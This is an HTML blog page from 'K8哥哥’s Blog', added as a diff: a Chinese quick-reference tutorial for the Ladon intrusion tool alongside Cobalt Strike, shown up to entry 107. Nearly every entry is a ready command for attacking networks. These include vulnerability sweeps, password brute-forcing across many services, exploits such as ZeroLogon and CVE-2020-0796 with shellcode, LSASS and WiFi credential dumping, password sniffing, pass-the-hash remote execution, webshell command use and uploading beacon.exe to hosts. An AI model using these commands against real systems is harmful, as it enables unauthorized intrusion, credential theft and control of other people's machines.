@@ -1,0 +1,1007 @@
+<!DOCTYPE html><html lang="en"><head>
+    <!--Setting-->
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, user-scalable=no, initial-scale=1.0, maximum-scale=1.0, minimum-scale=1.0">
+    <meta http-equiv="X-UA-Compatible" content="IE=Edge,chrome=1">
+    <meta http-equiv="Cache-Control" content="no-siteapp">
+    <meta http-equiv="Cache-Control" content="no-transform">
+    <meta name="renderer" content="webkit|ie-comp|ie-stand">
+    <meta name="apple-mobile-web-app-capable" content="K8哥哥’s Blog">
+    <meta name="apple-mobile-web-app-status-bar-style" content="black">
+    <meta name="format-detection" content="telephone=no,email=no,adress=no">
+    <meta name="browsermode" content="application">
+    <meta name="screen-orientation" content="portrait">
+    <meta name="theme-version" content="1.0.0">
+    <meta name="root" content="/">
+    <link rel="dns-prefetch" href="http://k8gege.org">
+    <!--SEO-->
+
+<meta name="keywords" content="">
+
+
+<meta name="description" content=" 
+
+
+
+window.location.href=" https:="" github.com="" k8gege="" ladon";="" ladon="" 简明使用教程="" 完整文档:="" k8gege.o..."="">
+
+
+<meta name="robots" content="all">
+<meta name="google" content="all">
+<meta name="googlebot" content="all">
+<meta name="verify" content="all">
+    <!--Title-->
+
+<title>
+    
+    Ladon &amp; Cobalt Strike简明教程 |
+    
+    K8哥哥’s Blog
+</title>
+
+<link rel="alternate" href="/atom.xml" title="K8哥哥’s Blog" type="application/atom+xml">
+
+
+<link rel="icon" href="/favicon.ico">
+
+    
+
+
+<link rel="stylesheet" href="/css/bootstrap.min.css?rev=3.3.7.css">
+<link rel="stylesheet" href="/css/font-awesome.min.css?rev=4.7.0.css">
+<link rel="stylesheet" href="/css/style.css?rev=@@hash.css">
+
+    
+
+
+
+    
+
+<meta name="generator" content="Hexo 7.3.0"></head>
+
+
+<!--[if lte IE 8]>
+<style>
+    html{ font-size: 1em }
+</style>
+<![endif]-->
+<!--[if lte IE 9]>
+<div style="ie">你使用的浏览器版本过低，为了你更好的阅读体验，请更新浏览器的版本或者使用其他现代浏览器，比如Chrome、Firefox、Safari等。</div>
+<![endif]-->
+<body>
+    <header class="main-header" style="background-image:url(
+    https://www.cnblogs.com/skins/CodingLife/images/title-yellow.png)">
+    <div class="main-header-box">
+        <a class="header-avatar" href="/" title="K8gege">
+            <img alt="logo" class="img-responsive" referrerpolicy="no-referrer" data-original="/../images/avatar.png">
+			<h3 class="K8tilte">K8哥哥</h3>
+        </a>
+        <div class="branding">
+            <!--<h2 class="text-hide">没有绝对安全的系统</h2>-->
+            
+            <h2>
+                没有绝对安全的系统
+            </h2>
+            
+        </div>
+    </div>
+	
+</header>
+    <nav class="main-navigation">
+    <div class="container">
+        <div class="row">
+            <div class="col-sm-12">
+                <div class="navbar-header"><span class="nav-toggle-button collapsed pull-right" data-toggle="collapse" data-target="#main-menu" id="mnav">
+                        <span class="sr-only"></span>
+                        <i class="fa fa-bars"></i>
+                    </span>
+                    <a class="navbar-brand" href="http://k8gege.org">
+                        K8哥哥’s Blog</a>
+                </div>
+                <div class="collapse navbar-collapse" id="main-menu">
+                    <ul class="menu">
+                        
+                        <li role="presentation" class="text-center">
+                            <a href="/"><i class="fa "></i>
+                                Home</a>
+                        </li>
+                        
+                        <li role="presentation" class="text-center">
+                            <a href="/Ladon/"><i class="fa "></i>
+                                Ladon</a>
+                        </li>
+                        
+                        <li role="presentation" class="text-center">
+                            <a href="/tags/Code/"><i class="fa "></i>
+                                Code</a>
+                        </li>
+                        
+                        <li role="presentation" class="text-center">
+                            <a href="/tags/Exp/"><i class="fa "></i>
+                                Exp</a>
+                        </li>
+                        
+                        <li role="presentation" class="text-center">
+                            <a href="/tags/Tool/"><i class="fa "></i>
+                                Tool</a>
+                        </li>
+                        
+                        <li role="presentation" class="text-center">
+                            <a href="/archives/"><i class="fa "></i>
+                                Archives</a>
+                        </li>
+                        
+                        <li role="presentation" class="text-center">
+                            <a href="/friends/"><i class="fa "></i>
+                                Friends</a>
+                        </li>
+                        
+                        <li role="presentation" class="text-center">
+                            <a href="/atom.xml"><i class="fa "></i>
+                                Rss</a>
+                        </li>
+                        
+                    </ul>
+                </div>
+            </div>
+        </div>
+    </div>
+</nav>
+    <section class="content-wrap">
+        <div class="container">
+            <div class="row">
+                <main class="col-md-8 main-content ">
+                    <div>
+    
+    <article class="post">
+    <h1 class="post-head">
+        Ladon &amp; Cobalt Strike简明教程
+    </h1>
+    <div class="post-body">
+        <p style="color:#fff;"> 
+&lt;% 
+<span class="archive-article-date">
+Visit <span id="busuanzi_value_page_pv"></span>
+</span>
+%&gt;
+</p>
+<script language="javascript" type="text/javascript">
+window.location.href="https://github.com/k8gege/Ladon";
+</script>
+<p>Ladon 简明使用教程 完整文档: <a href="https://k8gege.org/Ladon">https://k8gege.org/Ladon</a><br>
+支持Cmd、Cobalt Strike、PowerShell等内存加载<br>
+Windows版本: .Net、Cobalt Strike、PowerShell<br>
+全系统版本：GO(全平台)、Python(理论上全平台)<br>
+PS: Study方便本地测试使用，完整功能请使用CMD</p>
+<h3 id="版本">版本</h3>
+<p>Ladon 10.10 20230318<br>
+简明用法例子 202例</p>
+<h3 id="001-自定义线程扫描">001 自定义线程扫描</h3>
+<p>例子：扫描目标10.1.2段是否存在MS17010漏洞<br>
+单线程：Ladon 10.1.2.8/24 MS17010 t=1<br>
+80线程：Ladon noping 10.1.2.8/24 MS17010 t=80</p>
+<p>高强度防护下扫描线程设置低一些，单线程或F单线程最佳<br>
+单线程：Ladon 10.1.2.8/24 MS17010 f=1</p>
+<h3 id="002-Socks5代理扫描">002 Socks5代理扫描</h3>
+<p>例子：扫描目标10.1.2段是否存在MS17010漏洞（必须加noping）<br>
+Ladon noping 10.1.2.8/24 MS17010<br>
+详见：<a href="https://k8gege.org/Ladon/proxy.html">https://k8gege.org/Ladon/proxy.html</a></p>
+<h3 id="003-网段扫描-批量扫描">003 网段扫描/批量扫描</h3>
+<p>CIDR格式：不只是/24/16/8(所有)<br>
+Ladon 192.168.1.8/24 扫描模块<br>
+Ladon 192.168.1.8/16 扫描模块<br>
+Ladon 192.168.1.8/8  扫描模块</p>
+<p>字母格式：仅C段B段A段 顺序排序<br>
+Ladon 192.168.1.8/c 扫描模块<br>
+Ladon 192.168.1.8/b 扫描模块<br>
+Ladon 192.168.1.8/a 扫描模块</p>
+<h3 id="0x004指定IP范围、网段扫描">0x004指定IP范围、网段扫描</h3>
+<p>Ladon 192.168.1.50-192.168.1.200 ICMP  ICMP探测1段50-200的存活主机<br>
+Ladon 192.168.1.30-192.168.50.80 ICMP  ICMP探测1.30至50.80存活主机</p>
+<p>TXT格式</p>
+<h5 id="004-ICMP批量扫描C段列表存活主机">004 ICMP批量扫描C段列表存活主机</h5>
+<p>Ladon ip24.txt ICMP</p>
+<h5 id="005-ICMP批量扫描B段列表存活主机">005 ICMP批量扫描B段列表存活主机</h5>
+<p>Ladon ip16.txt ICMP</p>
+<h5 id="006-ICMP批量扫描cidr列表-如某国IP段">006 ICMP批量扫描cidr列表(如某国IP段)</h5>
+<p>Ladon cidr.txt ICMP</p>
+<h5 id="007-ICMP批量扫描域名是否存活">007 ICMP批量扫描域名是否存活</h5>
+<p>Ladon domain.txt ICMP</p>
+<h5 id="008-ICMP批量扫描机器是否存活">008 ICMP批量扫描机器是否存活</h5>
+<p>Ladon host.txt ICMP</p>
+<h5 id="009-WhatCMS批量识别CMS、Banner、SSL证书、标题，可识别未知CMS、路由器、打印机、网络设备、摄像头等">009 WhatCMS批量识别CMS、Banner、SSL证书、标题，可识别未知CMS、路由器、打印机、网络设备、摄像头等</h5>
+<p>Ladon 192.168.1.8 WhatCMS   扫描IP<br>
+Ladon 192.168.1.8/24 WhatCMS   扫描C段<br>
+Ladon 192.168.1.8/C WhatCMS   扫描C段<br>
+Ladon 192.168.1.8/B WhatCMS   扫描B段<br>
+Ladon 192.168.1.8/A WhatCMS   扫描A段<br>
+Ladon IP.TXT WhatCMS   扫描IP列表<br>
+Ladon IP24.TXT WhatCMS   扫描C段列表<br>
+Ladon IP16.TXT WhatCMS   扫描B段列表<br>
+Ladon cidr.TXT WhatCMS   扫描整个国家IP段列表<br>
+禁PING扫描<br>
+Ladon noping 192.168.1.8 WhatCMS   扫描IP<br>
+Ladon noping 192.168.1.8/24 WhatCMS   扫描C段</p>
+<h5 id="010-批量检测DrayTek路由器版本、漏洞、弱口令">010 批量检测DrayTek路由器版本、漏洞、弱口令</h5>
+<p>Ladon url.txt DraytekPoc</p>
+<h5 id="011-批量解密Base64密码">011 批量解密Base64密码</h5>
+<p>Ladon str.txt DeBase64</p>
+<h3 id="资产扫描、指纹识别、服务识别、存活主机、端口扫描">资产扫描、指纹识别、服务识别、存活主机、端口扫描</h3>
+<h5 id="012-ICMP扫描存活主机-最快">012 ICMP扫描存活主机(最快)</h5>
+<p>Ladon 192.168.1.8/24 ICMP</p>
+<h5 id="013-Ping探测存活主机-调用系统Ping命令-回显ms、ttl等信息">013 Ping探测存活主机(调用系统Ping命令 回显ms、ttl等信息)</h5>
+<p>Ladon 192.168.1.8/24 Ping</p>
+<h5 id="014-多协议探测存活主机-（IP、机器名、MAC-域名、制造商-系统版本）">014 多协议探测存活主机 （IP、机器名、MAC/域名、制造商/系统版本）</h5>
+<p>Ladon 192.168.1.8/24 OnlinePC</p>
+<h5 id="015-多协议识别操作系统-（IP、机器名、操作系统版本、开放服务）">015 多协议识别操作系统 （IP、机器名、操作系统版本、开放服务）</h5>
+<p>Ladon 192.168.1.8/24 OsScan</p>
+<h5 id="016-OXID探测多网卡主机">016 OXID探测多网卡主机</h5>
+<p>Ladon 192.168.1.8/24 EthScan<br>
+Ladon 192.168.1.8/24 OxidScan</p>
+<h5 id="017-DNS探测多网卡主机">017 DNS探测多网卡主机</h5>
+<p>Ladon 192.168.1.8/24 DnsScan</p>
+<h5 id="018-多协议扫描存活主机IP">018 多协议扫描存活主机IP</h5>
+<p>Ladon 192.168.1.8/24 OnlineIP</p>
+<h5 id="019-扫描SMB漏洞MS17010-（IP、机器名、漏洞编号、操作系统版本）">019 扫描SMB漏洞MS17010 （IP、机器名、漏洞编号、操作系统版本）</h5>
+<p>Ladon 192.168.1.8/24 MS17010</p>
+<h5 id="020-SMBGhost漏洞检测-CVE-2020-0796-（IP、机器名、漏洞编号、操作系统版本）">020 SMBGhost漏洞检测 CVE-2020-0796 （IP、机器名、漏洞编号、操作系统版本）</h5>
+<p>Ladon 192.168.1.8/24 SMBGhost</p>
+<h5 id="021-扫描Web信息-Http服务">021 扫描Web信息/Http服务</h5>
+<p>Ladon 192.168.1.8/24 WebScan</p>
+<h5 id="022-扫描C段站点URL域名">022 扫描C段站点URL域名</h5>
+<p>Ladon 192.168.1.8/24 UrlScan</p>
+<h5 id="023-扫描C段站点URL域名">023 扫描C段站点URL域名</h5>
+<p>Ladon 192.168.1.8/24 SameWeb</p>
+<h5 id="024-扫描子域名、二级域名">024 扫描子域名、二级域名</h5>
+<p>Ladon <a target="_blank" rel="noopener" href="http://baidu.com">baidu.com</a> SubDomain</p>
+<h5 id="025-域名解析IP、主机名解析IP">025 域名解析IP、主机名解析IP</h5>
+<p>Ladon <a target="_blank" rel="noopener" href="http://baidu.com">baidu.com</a> DomainIP<br>
+Ladon <a target="_blank" rel="noopener" href="http://baidu.com">baidu.com</a> HostIP</p>
+<h5 id="025-批量域名解析IP、批量主机名解析IP">025 批量域名解析IP、批量主机名解析IP</h5>
+<p>Ladon domain.txt DomainIP<br>
+Ladon host.txt HostIP</p>
+<h5 id="025-批量域名、主机名解析-结果只有IP">025 批量域名、主机名解析 结果只有IP</h5>
+<p>Ladon domain.txt Domain2IP<br>
+Ladon host.txt Host2IP</p>
+<h5 id="026-DNS查询域内机器、IP-条件域内">026 DNS查询域内机器、IP (条件域内)</h5>
+<p>Ladon AdiDnsDump 192.168.1.8 (Domain IP)</p>
+<h5 id="027-查询域内机器、IP-条件域内">027 查询域内机器、IP (条件域内)</h5>
+<p>Ladon GetDomainIP</p>
+<h5 id="028-扫描C段端口、指定端口扫描">028 扫描C段端口、指定端口扫描</h5>
+<p>Ladon 192.168.1.8/24 PortScan<br>
+Ladon 192.168.1.8 PortScan 80,445,3389</p>
+<h5 id="029-扫描C段WEB及识别CMS（86-Web指纹识别）">029 扫描C段WEB及识别CMS（86+Web指纹识别）</h5>
+<p>Ladon 192.168.1.8/24 WhatCMS</p>
+<h5 id="030-扫描思科设备">030 扫描思科设备</h5>
+<p>Ladon 192.168.1.8/24 CiscoInfo<br>
+Ladon <a target="_blank" rel="noopener" href="http://192.168.1.8">http://192.168.1.8</a> CiscoInfo</p>
+<h5 id="031-枚举Mssql数据库主机-（数据库IP、机器名、SQL版本）">031 枚举Mssql数据库主机 （数据库IP、机器名、SQL版本）</h5>
+<p>Ladon EnumMssql</p>
+<h5 id="032-枚举网络共享资源-（域、IP、主机名-共享路径）">032 枚举网络共享资源 	（域、IP、主机名\共享路径）</h5>
+<p>Ladon EnumShare</p>
+<h5 id="033-扫描LDAP服务器-探测域控">033 扫描LDAP服务器(探测域控)</h5>
+<p>Ladon 192.168.1.8/24 LdapScan</p>
+<h5 id="034-扫描FTP服务器并识别版本">034 扫描FTP服务器并识别版本</h5>
+<p>Ladon 192.168.1.8/24 FtpScan</p>
+<h3 id="暴力破解-网络认证-弱口令-密码爆破-数据库-网站后台-登陆口-系统登陆">暴力破解/网络认证/弱口令/密码爆破/数据库/网站后台/登陆口/系统登陆</h3>
+<p>密码爆破详解参考SSH：<a href="https://k8gege.org/Ladon/sshscan.html">https://k8gege.org/Ladon/sshscan.html</a></p>
+<h5 id="035-445端口-SMB密码爆破-Windows">035 445端口 SMB密码爆破(Windows)</h5>
+<p>Ladon 192.168.1.8/24 SmbScan</p>
+<h5 id="036-135端口-Wmi密码爆破-Windowns">036 135端口 Wmi密码爆破(Windowns)</h5>
+<p>Ladon 192.168.1.8/24 WmiScan</p>
+<h5 id="037-389端口-LDAP服务器、AD域密码爆破-Windows">037 389端口 LDAP服务器、AD域密码爆破(Windows)</h5>
+<p>Ladon 192.168.1.8/24 LdapScan</p>
+<h5 id="038-5985端口-Winrm密码爆破-Windowns">038 5985端口 Winrm密码爆破(Windowns)</h5>
+<p>Ladon 192.168.1.8/24 WinrmScan</p>
+<h5 id="039-445端口-SMB-NTLM-HASH爆破-Windows">039 445端口 SMB NTLM HASH爆破(Windows)</h5>
+<p>Ladon 192.168.1.8/24 SmbHashScan</p>
+<h5 id="040-135端口-Wmi-NTLM-HASH爆破-Windows">040 135端口 Wmi NTLM HASH爆破(Windows)</h5>
+<p>Ladon 192.168.1.8/24 WmiHashScan</p>
+<h5 id="041-22端口-SSH密码爆破-Linux">041 22端口 SSH密码爆破(Linux)</h5>
+<p>Ladon 192.168.1.8/24 SshScan<br>
+Ladon 192.168.1.8:22 SshScan</p>
+<h5 id="042-1433端口-Mssql数据库密码爆破">042 1433端口 Mssql数据库密码爆破</h5>
+<p>Ladon 192.168.1.8/24 MssqlScan</p>
+<h5 id="043-1521端口-Oracle数据库密码爆破">043 1521端口 Oracle数据库密码爆破</h5>
+<p>Ladon 192.168.1.8/24 OracleScan</p>
+<h5 id="044-3306端口-Mysql数据库密码爆破">044 3306端口 Mysql数据库密码爆破</h5>
+<p>Ladon 192.168.1.8/24 MysqlScan</p>
+<h5 id="045-7001端口-Weblogic后台密码爆破">045 7001端口 Weblogic后台密码爆破</h5>
+<p>Ladon <a target="_blank" rel="noopener" href="http://192.168.1.8:7001/console">http://192.168.1.8:7001/console</a> WeblogicScan<br>
+Ladon 192.168.1.8/24 WeblogicScan</p>
+<h5 id="046-5900端口-VNC远程桌面密码爆破">046 5900端口 VNC远程桌面密码爆破</h5>
+<p>Ladon 192.168.1.8/24 VncScan</p>
+<h5 id="047-21端口-Ftp服务器密码爆破">047 21端口 Ftp服务器密码爆破</h5>
+<p>Ladon 192.168.1.8/24 FtpScan</p>
+<h5 id="048-8080端口-Tomcat后台登陆密码爆破">048 8080端口 Tomcat后台登陆密码爆破</h5>
+<p>Ladon 192.168.1.8/24 TomcatScan<br>
+Ladon <a target="_blank" rel="noopener" href="http://192.168.1.8:8080/manage">http://192.168.1.8:8080/manage</a> TomcatScan</p>
+<h5 id="049-Web端口-401基础认证密码爆破">049 Web端口 401基础认证密码爆破</h5>
+<p>Ladon <a target="_blank" rel="noopener" href="http://192.168.1.8/login">http://192.168.1.8/login</a> HttpBasicScan</p>
+<h5 id="050-445端口-Impacket-SMB密码爆破-Windowns">050 445端口 Impacket SMB密码爆破(Windowns)</h5>
+<p>Ladon 192.168.1.8/24 SmbScan.ini</p>
+<h5 id="051-445端口-IPC密码爆破-Windowns">051 445端口 IPC密码爆破(Windowns)</h5>
+<p>Ladon 192.168.1.8/24 IpcScan.ini</p>
+<h5 id="052-139端口Netbios协议Windows密码爆破">052 139端口Netbios协议Windows密码爆破</h5>
+<p>Ladon 192.168.1.8/24 NbtScan</p>
+<h5 id="053-5985端口Winrm协议Windows密码爆破">053 5985端口Winrm协议Windows密码爆破</h5>
+<p>Ladon 192.168.1.8/24 WinrmScan</p>
+<h5 id="054-网络摄像头密码爆破-内置默认密码">054 网络摄像头密码爆破(内置默认密码)</h5>
+<p>Ladon 192.168.1.8/24 DvrScan</p>
+<h3 id="漏洞检测-Poc">漏洞检测/Poc</h3>
+<h5 id="055-SMB漏洞检测-CVE-2017-0143-CVE-2017-0144">055 SMB漏洞检测(CVE-2017-0143/CVE-2017-0144)</h5>
+<p>Ladon 192.168.1.8/24 MS17010</p>
+<h5 id="056-SMBGhost漏洞检测-CVE-2020-0796">056 SMBGhost漏洞检测 CVE-2020-0796</h5>
+<p>Ladon 192.168.1.8/24 SMBGhost</p>
+<h5 id="057-Weblogic漏洞检测-CVE-2019-2725-CVE-2018-2894">057 Weblogic漏洞检测(CVE-2019-2725/CVE-2018-2894)</h5>
+<p>Ladon 192.168.1.8/24 WeblogicPoc</p>
+<h5 id="058-PhpStudy后门检测-phpstudy-2016-phpstudy-2018">058 PhpStudy后门检测(phpstudy 2016/phpstudy 2018)</h5>
+<p>Ladon 192.168.1.8/24 PhpStudyPoc</p>
+<h5 id="059-ActiveMQ漏洞检测-CVE-2016-3088">059 ActiveMQ漏洞检测(CVE-2016-3088)</h5>
+<p>Ladon 192.168.1.8/24 ActivemqPoc</p>
+<h5 id="060-Tomcat漏洞检测-CVE-2017-12615">060 Tomcat漏洞检测(CVE-2017-12615)</h5>
+<p>Ladon 192.168.1.8/24 TomcatPoc</p>
+<h5 id="061-Struts2漏洞检测-S2-005-S2-009-S2-013-S2-016-S2-019-S2-032-DevMode">061 Struts2漏洞检测(S2-005/S2-009/S2-013/S2-016/S2-019/S2-032/DevMode)</h5>
+<p>Ladon 192.168.1.8/24 Struts2Poc</p>
+<h5 id="062-DraytekPoc-CVE-2020-8515漏洞检测、Draytek版本探测、弱口令检测">062 DraytekPoc CVE-2020-8515漏洞检测、Draytek版本探测、弱口令检测</h5>
+<p>Ladon 192.168.1.8 DraytekPoc<br>
+Ladon 192.168.1.8/24 DraytekPoc</p>
+<h3 id="漏洞利用-Exploit">漏洞利用/Exploit</h3>
+<h5 id="063-Weblogic漏洞利用-CVE-2019-2725">063 Weblogic漏洞利用(CVE-2019-2725)</h5>
+<p>Ladon 192.168.1.8/24 WeblogicExp</p>
+<h5 id="064-Tomcat漏洞利用-CVE-2017-12615">064 Tomcat漏洞利用(CVE-2017-12615)</h5>
+<p>Ladon 192.168.1.8/24 TomcatExp</p>
+<h5 id="065-Windows-0day漏洞通用DLL注入执行CMD生成器-DLL仅5KB">065 Windows 0day漏洞通用DLL注入执行CMD生成器(DLL仅5KB)</h5>
+<p>Ladon CmdDll x86 calc<br>
+Ladon CmdDll x64 calc<br>
+Ladon CmdDll b64x86 YwBhAGwAYwA=<br>
+Ladon CmdDll b64x64 YwBhAGwAYwA=</p>
+<h5 id="066-CVE-2021-40444-微软IE-Office-0day漏洞">066 CVE-2021-40444  微软IE/Office 0day漏洞</h5>
+<p>Ladon CVE-2021-40444 MakeCab poc.dll<br>
+Ladon CVE-2021-40444 MakeHtml <a target="_blank" rel="noopener" href="http://192.168.1.8">http://192.168.1.8</a></p>
+<h5 id="067-DraytekExp-CVE-2020-8515远程执行命令EXP">067 DraytekExp CVE-2020-8515远程执行命令EXP</h5>
+<p>Ladon DraytekExp <a target="_blank" rel="noopener" href="http://192.168.1.8">http://192.168.1.8</a>  whoami</p>
+<h5 id="068-ZeroLogon-CVE-2020-1472域控提权-密码置空">068 ZeroLogon CVE-2020-1472域控提权(密码置空)</h5>
+<p>Ladon ZeroLogon <a target="_blank" rel="noopener" href="http://dc.k8gege.org">dc.k8gege.org</a></p>
+<h5 id="069-CVE-2020-0688-Exchange序列化漏洞-net-4-0">069 CVE-2020-0688 Exchange序列化漏洞(.net 4.0)</h5>
+<p>Ladon cve-2020-0688 192.168.1.142 Administrator K8gege520</p>
+<h5 id="070-ForExec循环漏洞利用-Win10永恒之黑CVE-2020-0796-成功退出以免目标蓝屏">070 ForExec循环漏洞利用(Win10永恒之黑CVE-2020-0796,成功退出以免目标蓝屏)</h5>
+<p>Ladon ForExec “CVE-2020-0796-Exp -i 192.168.1.8 -p 445 -e --load-shellcode test.txt” 80 “Exploit finnished”</p>
+<h3 id="文件下载、文件传输">文件下载、文件传输</h3>
+<h5 id="071-HTTP下载-HTTPS下载-MSF下载">071 HTTP下载 HTTPS下载 MSF下载</h5>
+<p>Ladon wget <a target="_blank" rel="noopener" href="https://downloads.metasploit.com/data/releases/metasploit-latest-windows-x64-installer.exe">https://downloads.metasploit.com/data/releases/metasploit-latest-windows-x64-installer.exe</a><br>
+Ladon HttpDownLoad <a href="https://k8gege.org/Download/Ladon.rar">https://k8gege.org/Download/Ladon.rar</a></p>
+<h5 id="072-Ftp下载">072 Ftp下载</h5>
+<p>Ladon FtpDownLoad 127.0.0.1:21 admin admin test.exe</p>
+<h3 id="加密解密-HEX-Base64">加密解密(HEX/Base64)</h3>
+<h5 id="073-Hex加密解密">073 Hex加密解密</h5>
+<p>Ladon 123456 EnHex<br>
+Ladon 313233343536 DeHex</p>
+<h5 id="074-Base64加密解密">074 Base64加密解密</h5>
+<p>Ladon 123456 EnBase64<br>
+Ladon MTIzNDU2 DeBase64</p>
+<h3 id="网络嗅探">网络嗅探</h3>
+<h5 id="075-Ftp密码嗅探">075 Ftp密码嗅探</h5>
+<p>Ladon FtpSniffer 192.168.1.5</p>
+<h5 id="076-HTTP密码嗅探">076 HTTP密码嗅探</h5>
+<p>Ladon HTTPSniffer 192.168.1.5</p>
+<h5 id="077-网络嗅探">077 网络嗅探</h5>
+<p>Ladon Sniffer</p>
+<h3 id="密码读取">密码读取</h3>
+<h5 id="078-读取IIS站点密码、网站路径">078 读取IIS站点密码、网站路径</h5>
+<p>Ladon IISpwd</p>
+<h5 id="079-读取连接过的WIFI密码">079 读取连接过的WIFI密码</h5>
+<p>Ladon WifiPwd</p>
+<h5 id="080-读取FileZilla-FTP密码">080 读取FileZilla FTP密码</h5>
+<p>Ladon FileZillaPwd</p>
+<h5 id="081-读取系统Hash、VPN密码、DPAPI-Key">081 读取系统Hash、VPN密码、DPAPI-Key</h5>
+<p>Ladon CVE-2021-36934</p>
+<h5 id="082-DumpLsass内存密码-mimikatz明文-限9-1-1版本之前">082 DumpLsass内存密码(mimikatz明文) 限9.1.1版本之前</h5>
+<p>Ladon DumpLsass</p>
+<h3 id="信息收集">信息收集</h3>
+<h5 id="083-获取本机内网IP与外网IP">083 获取本机内网IP与外网IP</h5>
+<p>Ladon GetIP</p>
+<h5 id="084-获取PCname-GUID-CPUID-DiskID-Mac地址">084 获取PCname GUID CPUID DiskID Mac地址</h5>
+<p>Ladon GetID</p>
+<h5 id="085-查看用户最近访问文件">085 查看用户最近访问文件</h5>
+<p>Ladon Recent</p>
+<h5 id="086-USB使用记录查看-USB名称、USB标记、路径信息">086 USB使用记录查看(USB名称、USB标记、路径信息)</h5>
+<p>Ladon UsbLog</p>
+<h5 id="087-检测后门-注册表启动项、DLL劫持">087 检测后门(注册表启动项、DLL劫持)</h5>
+<p>Ladon CheckDoor<br>
+Ladon AutoRun</p>
+<h5 id="088-进程详细信息-程序路径、位数、启动参数、用户">088 进程详细信息(程序路径、位数、启动参数、用户)</h5>
+<p>Ladon EnumProcess<br>
+Ladon Tasklist</p>
+<h5 id="089-获取命令行参数">089 获取命令行参数</h5>
+<p>Ladon cmdline<br>
+Ladon cmdline cmd.exe</p>
+<h5 id="090-获取渗透基础信息">090 获取渗透基础信息</h5>
+<p>Ladon GetInfo<br>
+Ladon GetInfo2</p>
+<h5 id="091-NET-PowerShell版本">091 .NET &amp; PowerShell版本</h5>
+<p>Ladon NetVer<br>
+Ladon PSver<br>
+Ladon NetVersion<br>
+Ladon PSversion</p>
+<h5 id="092-运行时版本-编译环境">092 运行时版本&amp;编译环境</h5>
+<p>Ladon Ver<br>
+Ladon Version</p>
+<h5 id="093-运行时版本-编译环境-安装软件列表">093 运行时版本&amp;编译环境&amp;安装软件列表</h5>
+<p>Ladon AllVer<br>
+Ladon AllVersion</p>
+<h5 id="094-查看IE代理信息">094 查看IE代理信息</h5>
+<p>Ladon QueryProxy</p>
+<h5 id="095-列目录">095  列目录</h5>
+<p>Ladon DirList		默认列全盘<br>
+Ladon DirList c:\   指定盘符或目录</p>
+<h5 id="096-QueryAdmin查看管理员用户">096 QueryAdmin查看管理员用户</h5>
+<p>Ladon QueryAdmin</p>
+<h5 id="097-查看本机命名管道">097 查看本机命名管道</h5>
+<p>Ladon GetPipe</p>
+<h5 id="098-RdpLog查看3389连接记录">098 RdpLog查看3389连接记录</h5>
+<p>Ladon RdpLog</p>
+<h3 id="远程执行-psexec-wmiexec-atexec-sshexec-smbexec">远程执行(psexec/wmiexec/atexec/sshexec/smbexec)</h3>
+<h5 id="099-445端口-加密PSEXEC远程执行命令（交互式）">099 445端口 加密PSEXEC远程执行命令（交互式）</h5>
+<p>net use \192.168.1.8 k8gege520 /user:k8gege<br>
+Ladon psexec 192.168.1.8<br>
+psexec&gt; whoami<br>
+nt authority\system</p>
+<h5 id="100-135端口-WmiExec远程执行命令-（非交互式）">100 135端口 WmiExec远程执行命令 （非交互式）</h5>
+<p>Ladon wmiexec 192.168.1.8 k8gege k8gege520 whoami  (8.2前用法)<br>
+Ladon wmiexec 192.168.1.8 k8gege k8gege520 cmd whoami  (8.2后用法)<br>
+Ladon wmiexec 192.168.1.8 k8gege k8gege520 b64cmd d2hvYW1p  (8.2后用法)</p>
+<h5 id="101-445端口-AtExec远程执行命令（非交互式）">101 445端口 AtExec远程执行命令（非交互式）</h5>
+<p>Ladon AtExec 192.168.1.8 k8gege k8gege520 whoami</p>
+<h5 id="102-22端口-SshExec远程执行命令（非交互式）">102 22端口 SshExec远程执行命令（非交互式）</h5>
+<p>Ladon SshExec 192.168.1.8 k8gege k8gege520 whoami<br>
+Ladon SshExec 192.168.1.8 22 k8gege k8gege520 whoami</p>
+<h5 id="103-JspShell远程执行命令（非交互式）9-3-0移除">103 JspShell远程执行命令（非交互式）9.3.0移除</h5>
+<p>Usage：Ladon JspShell type url pwd cmd<br>
+Example: Ladon JspShell ua <a target="_blank" rel="noopener" href="http://192.168.1.8/shell.jsp">http://192.168.1.8/shell.jsp</a> Ladon whoami</p>
+<h5 id="104-WebShell远程执行命令（非交互式）9-3-0移除">104 WebShell远程执行命令（非交互式）9.3.0移除</h5>
+<figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">Usage：Ladon WebShell ScriptType ShellType url <span class="built_in">pwd</span> cmd</span><br><span class="line">Example: Ladon WebShell jsp ua http://192.168.1.8/shell.jsp Ladon <span class="built_in">whoami</span></span><br><span class="line">Example: Ladon WebShell aspx <span class="built_in">cd</span> http://192.168.1.8/1.aspx Ladon <span class="built_in">whoami</span></span><br><span class="line">Example: Ladon WebShell php ua http://192.168.1.8/1.php Ladon <span class="built_in">whoami</span></span><br><span class="line">Example: Ladon WebShell jsp 5 http://192.168.1.8/123.jsp Ladon <span class="built_in">whoami</span></span><br><span class="line">获取系统版本信息 方便提权</span><br><span class="line">Example: Ladon WebShell jsp 5 http://192.168.1.8/123.jsp Ladon OSinfo</span><br></pre></td></tr></tbody></table></figure>
+<h5 id="105-135端口-WmiExec2远程执行命令支持HASH-（非交互式）支持文件上传">105 135端口 WmiExec2远程执行命令支持HASH （非交互式）支持文件上传</h5>
+<p>Usage:<br>
+Ladon WmiExec2 host user pass cmd whoami<br>
+Ladon WmiExec2 pth host cmd whoami		 先Mimikatz注入Hash，再pth执行命令<br>
+Base64Cmd for Cobalt Strike<br>
+Ladon WmiExec2 host user pass b64cmd dwBoAG8AYQBtAGkA<br>
+Ladon WmiExec2 host user pass b64cmd dwBoAG8AYQBtAGkA<br>
+Upload:<br>
+Ladon WmiExec2 host user pass upload beacon.exe ceacon.exe<br>
+Ladon WmiExec2 pth host upload beacon.exe ceacon.exe  先Mimikatz注入Hash，再pth执行命令</p>
+<h5 id="106-445端口-SmbExec-Ntlm-Hash非交互式远程执行命令-无回显">106 445端口 SmbExec Ntlm-Hash非交互式远程执行命令(无回显)</h5>
+<p>Ladon SmbExec 192.168.1.8 k8gege k8gege520 cmd whoami<br>
+Ladon SmbExec 192.168.1.8 k8gege k8gege520 b64cmd d2hvYW1p</p>
+<h5 id="107-WinrmExec远程执行命令无回显（支持System权限）">107 WinrmExec远程执行命令无回显（支持System权限）</h5>
